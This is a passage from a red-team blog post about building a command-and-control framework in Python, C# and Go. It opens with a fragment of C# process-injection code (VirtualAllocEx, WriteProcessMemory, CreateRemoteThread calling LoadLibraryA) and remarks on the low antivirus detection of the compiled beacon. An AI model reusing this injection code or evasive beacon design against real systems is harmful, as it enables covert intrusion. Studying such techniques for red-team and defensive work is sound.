        <span class="n">IntPtr</span> <span class="n">allocMemAddress</span> <span class="p">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)((</span><span class="n">dllName</span><span class="p">.</span><span class="n">Length</span> <span class="p">+</span> <span class="m">1</span><span class="p">)</span> <span class="p">*</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">SizeOf</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="kt">char</span><span class="p">))),</span> <span class="n">MEM_COMMIT</span> <span class="p">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

        <span class="c1">// writing the name of the dll there</span>
        <span class="n">UIntPtr</span> <span class="n">bytesWritten</span><span class="p">;</span>
        <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">allocMemAddress</span><span class="p">,</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">dllName</span><span class="p">),</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)((</span><span class="n">dllName</span><span class="p">.</span><span class="n">Length</span> <span class="p">+</span> <span class="m">1</span><span class="p">)</span> <span class="p">*</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">SizeOf</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="kt">char</span><span class="p">))),</span> <span class="k">out</span> <span class="n">bytesWritten</span><span class="p">);</span>

        <span class="c1">// creating a thread that will call LoadLibraryA with allocMemAddress as argument</span>
        <span class="nf">CreateRemoteThread</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">loadLibraryAddr</span><span class="p">,</span> <span class="n">allocMemAddress</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>

        <span class="k">return</span> <span class="m">0</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>This reads strikingly similar to C++ functions designed to do the same thing. The point being that by using C# instead of C++, there’s very little sacrificed.</p><p>Go was evidently easier to transition to, but C# definitely had more to teach me. Go was very forgiving with how the program coud be laid out while with C#, if you got the function declaration wrong, nothing would work. C# was also very interesting from a compilation standpoint. The program could be compiled down to a DLL through the shortcut <code class="language-plaintext highlighter-rouge">ctrl shft b</code> or an executable for Windows or Ubuntu with <code class="language-plaintext highlighter-rouge">dotnet publish -c Release -r win10-x64</code> without issue, and this opens up even more avenues of exploitation. The detection rate for each file was also increadibly low: <a href="/assets/img/What-I-Learned/cs-exe.png" class="popup img-link "><img data-src="/assets/img/What-I-Learned/cs-exe.png" alt="CSVT" class="lazyload" data-proofer-ignore></a></p><h1 id="what-was-learned">What Was Learned</h1><p>It is exhausting keeping up with all the issues that are discovered along the way, but that’s the case with any project this size. Regardless of how tiring it was, learning how to use gRPC and how to build the same application in Python, C#, and Go was really rewarding. Comparing the different detection rates between languages was interesting and shows that engines still have a long way to go with analysis, so implementing additional protections that look at behaviour is very important.</p><p>Some may be wondering why the only method implemented in the beacon is direct command execution. Why not put in other tools like registry modification, file deletion, file upload, and SMB communication that don’t go through the command prompt? These are not off the table at all and all are good ideas, but for the original purposes of this project, being able to execute arbitrary commands was enough as it could do most of these functions anyways, just in a much more bulky and cumbersome manner.</p><p>Another question may be why use Flask, why not handle the HTTP requests through other methods like in Go? A valid question! The primary reason for using Flask was that it was the quickest way to build it out in Python, which is the language I know the strongest. Flask has a bunch of great features as well like being able to serve TLS secured connections, though this can be worked around again using an nginx front end. Because I was able to handle everything very intuitively through Flask, I could spend more time focusing on other aspects of the framework. Or another way to put it, if you cook a lot, is to bake the bread and buy the butter.</p></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Breaking%20Down%20Creating%20A%20Redteam%20Framework%20-%20Culbert%20Report&url=%2Fposts%2FBreaking-Down-Creating-A-Redteam-Framework%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Breaking%20Down%20Creating%20A%20Redteam%20Framework%20-%20Culbert%20Report&u=%2Fposts%2FBreaking-Down-Creating-A-Redteam-Framework%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2FBreaking-Down-Creating-A-Redteam-Framework%2F&text=Breaking%20Down%20Creating%20A%20Redteam%20Framework%20-%20Culbert%20Report" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Making-Red-Teaming-Safer/">Making Red Teaming Safer</a><li><a href="/posts/Human-Learning-Is-Irreplaceable/">Human Learning Is Irreplaceable</a><li><a href="/posts/Building-A-Detection-Lab-Around-Suricata/">Building A Detection Lab Around Suricata</a><li><a href="/posts/The-evolution-of-evasion/">The Evolution Of Evasion</a><li><a href="/posts/C2-Smackdown-Empire-vs-Mythic/">C2 Smackdown Empire Vs Mythic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/c2/">c2</a> <a class="post-tag" href="/tags/container/">container</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/graphana/">graphana</a> <a class="post-tag" href="/tags/jira/">jira</a> <a class="post-tag" href="/tags/nessus/">nessus</a> <a class="post-tag" href="/tags/non-technical/">non-technical</a> <a class="post-tag" href="/tags/nuages/">nuages</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/We-have-lost-the-plot-with-LLMs/"><div class="card-body"> <em class="small" data-ts="1771804800" data-df="ll" > Feb 23, 2026 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>We Have Lost The Plot With Llms</h3><div class="text-muted small"><p> We’ve collectively lost the plot In IT and security we say that users are the weakest link, but this is no longer true; now, the weakest link is whatever LLM your company is using to act as both a ...</p></div></div></a></div><div class="card"> <a href="/posts/Language-models-cannot-make-art/"><div class="card-body"> <em class="small" data-ts="1770249600" data-df="ll" > Feb 5, 2026 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Language Models Cannot Make Art</h3><div class="text-muted small"><p> I was in a random coffee shop a few months back and I noticed that they had little “coffee table” books for sale. One that caught my eye was a Japanese color combination dictionary, originally prin...</p></div></div></a></div><div class="card"> <a href="/posts/Human-Learning-Is-Irreplaceable/"><div class="card-body"> <em class="small" data-ts="1759881600" data-df="ll" > Oct 8, 2025 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Human Learning Is Irreplaceable</h3><div class="text-muted small"><p> What we call “AI” is really just a cancer attacking our ability to learn and we have very little time remaining to carve it out. A note When I began writing this, it was June in Vermont and one ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Malvertising-Continued/" class="btn btn-outline-primary" prompt="Older"><p>Malvertising Continued</p></a> <a href="/posts/Sliver-vs-Havoc/" class="btn btn-outline-primary" prompt="Newer"><p>Sliver vs Havoc</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/c2/">c2</a> <a class="post-tag" href="/tags/container/">container</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/graphana/">graphana</a> <a class="post-tag" href="/tags/jira/">jira</a> <a class="post-tag" href="/tags/nessus/">nessus</a> <a class="post-tag" href="/tags/non-technical/">non-technical</a> <a class="post-tag" href="/tags/nuages/">nuages</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/">Matt Culbert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
